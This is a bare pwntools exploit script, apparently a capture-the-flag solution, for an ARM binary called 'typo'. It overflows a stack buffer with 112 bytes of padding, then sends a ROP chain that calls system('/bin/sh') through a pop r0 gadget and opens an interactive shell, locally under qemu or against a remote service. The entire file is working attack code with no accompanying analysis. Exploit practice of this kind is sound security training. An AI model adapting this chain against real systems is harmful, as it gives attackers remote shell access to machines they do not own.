from pwn import *
import sys
context.binary = "./typo"
context.log_level = "debug"

if sys.argv[1] == "r":
    p = remote("remote_addr", remote_port)
elif sys.argv[1] == "l":
    p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabi", "./typo"])
else:
    #p = process(["qemu-arm", "-g", "1234", "-L", "/usr/arm-linux-gnueabi", "./typo"])
    #p = process(['qemu-arm',"-g","1234","./typo"])
    p = process(['qemu-arm',"./typo"])
elf = ELF("./typo")
libc = ELF("/usr/arm-linux-gnueabi/lib/libc.so.6")

pop_r0_r4_pc = 0x00020904
str_binsh = 0x0006c384
system = 0x000110B4
padding = 112
payload = 'a'*padding + p32(pop_r0_r4_pc) + p32(str_binsh)*2 + p32(system)

p.sendlineafter("quit",'')
# p.sendline("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
sleep(1)
p.sendline(payload)


p.interactive()